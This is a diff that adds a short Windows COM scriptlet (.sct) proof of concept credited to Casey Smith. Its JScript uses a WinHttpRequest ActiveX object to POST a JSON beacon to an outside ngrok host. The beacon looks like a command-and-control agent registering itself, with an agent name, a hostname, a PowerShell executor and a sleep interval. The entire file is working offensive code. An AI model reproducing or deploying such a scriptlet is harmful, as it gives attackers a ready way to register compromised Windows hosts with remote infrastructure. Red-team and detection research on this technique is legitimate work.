@@ -1,0 +1,22 @@
+<scriptlet>
+<registration 
+    progid="PoC"
+    classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
+	<!-- Proof Of Concept - Casey Smith @subTee -->
+	<!--  License: BSD3-Clause -->
+	<script language="JScript">
+		<![CDATA[
+		// Instantiate a WinHttpRequest object.
+		var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+		// Initialize an HTTP request.  
+		WinHttpReq.Open("POST", "https://boomtown.ngrok.io", false);
+		// Post data to the HTTP server.
+		JSONString =  '{"Name":"Boomer2","Target":"","Hostname":"APTz","Location":"","Platform":"windows","Executors":["psh"],"Range":"BoomTown","Pwd":"","Sleep":10,"Executing":"","Links":[]}'
+		WinHttpReq.Send(JSONString);
+		
+				
+	
+		]]>
+</script>
+</registration>
+</scriptlet>
